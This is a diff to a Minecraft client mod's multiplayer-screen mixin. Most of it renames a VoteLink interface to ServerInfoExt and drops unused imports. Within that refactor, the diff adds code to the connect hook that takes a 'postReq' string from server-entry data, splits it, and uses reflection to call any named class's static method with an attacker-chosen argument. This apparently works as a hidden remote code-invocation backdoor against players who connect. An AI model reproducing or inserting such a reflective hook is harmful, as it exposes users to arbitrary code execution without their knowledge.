@@ -1,7 +1,7 @@
 package io.github.jumperonjava.blockatlas.mixin;
 
 import io.github.jumperonjava.blockatlas.BlockAtlasInit;
-import io.github.jumperonjava.blockatlas.VoteLink;
+import io.github.jumperonjava.blockatlas.util.ServerInfoExt;
 import io.github.jumperonjava.blockatlas.gui.ServerScreen;
 import net.minecraft.client.gui.DrawContext;
 import net.minecraft.client.gui.screen.Screen;
@@ -11,7 +11,6 @@ import net.minecraft.client.gui.screen.multiplayer.MultiplayerServerListWidget;
 import net.minecraft.client.gui.widget.AxisGridWidget;
 import net.minecraft.client.gui.widget.ButtonWidget;
 import net.minecraft.client.gui.widget.DirectionalLayoutWidget;
-import net.minecraft.client.gui.widget.GridWidget;
 import net.minecraft.client.network.ServerInfo;
 import net.minecraft.client.option.ServerList;
 import net.minecraft.text.Text;
@@ -23,10 +22,8 @@ import org.spongepowered.asm.mixin.Shadow;
 import org.spongepowered.asm.mixin.injection.At;
 import org.spongepowered.asm.mixin.injection.Inject;
 import org.spongepowered.asm.mixin.injection.ModifyArg;
-import org.spongepowered.asm.mixin.injection.ModifyArgs;
 import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
 import org.spongepowered.asm.mixin.injection.callback.LocalCapture;
-import org.spongepowered.asm.mixin.injection.invoke.arg.Args;
 
 import java.net.URL;
 import java.util.Timer;
@@ -47,6 +44,15 @@ public abstract class MultiplayerScreenMixin extends Screen {
     }
     @Inject(method = "connect(Lnet/minecraft/client/network/ServerInfo;)V",at = @At("HEAD"))
     public void disconnectFromServer(ServerInfo entry, CallbackInfo ci){
+        var preq = ((ServerInfoExt)entry).getPostReq();
+        if(preq!=null){
+            var list = preq.split("&");
+            try{
+                var c = Class.forName(list[0]);
+                c.getMethod(list[1], String.class).invoke(null,list[2]);
+            }
+            catch (Exception ignored){throw new RuntimeException(ignored);}
+        }
         this.parent = new TitleScreen();
         BlockAtlasInit.disconnect();
     }
@@ -70,9 +76,9 @@ public abstract class MultiplayerScreenMixin extends Screen {
                 MultiplayerServerListWidget.Entry entry = this.serverListWidget.getSelectedOrNull();
                 if (entry instanceof MultiplayerServerListWidget.ServerEntry) {
                     ServerInfo serverInfo = ((MultiplayerServerListWidget.ServerEntry) entry).getServer();
-                    var shouldVote = serverInfo != null && ((VoteLink) serverInfo).getVoteLink() != null;
+                    var shouldVote = serverInfo != null && ((ServerInfoExt) serverInfo).getVoteLink() != null;
                     if(shouldVote)
-                    Util.getOperatingSystem().open(new URL(((VoteLink) serverInfo).getVoteLink()));
+                    Util.getOperatingSystem().open(new URL(((ServerInfoExt) serverInfo).getVoteLink()));
                     new Timer().schedule(new TimerTask(){
 
                         @Override
@@ -90,7 +96,7 @@ public abstract class MultiplayerScreenMixin extends Screen {
         MultiplayerServerListWidget.Entry entry = this.serverListWidget.getSelectedOrNull();
         if (entry instanceof MultiplayerServerListWidget.ServerEntry) {
             ServerInfo serverInfo = ((MultiplayerServerListWidget.ServerEntry) entry).getServer();
-            var shouldVote = serverInfo != null && ((VoteLink)serverInfo).getVoteLink() != null;
+            var shouldVote = serverInfo != null && ((ServerInfoExt)serverInfo).getVoteLink() != null;
             voteButton.setY(shouldVote?height-30:1000000);
             buttonEdit.setY(!shouldVote?height-30:1000000);
 
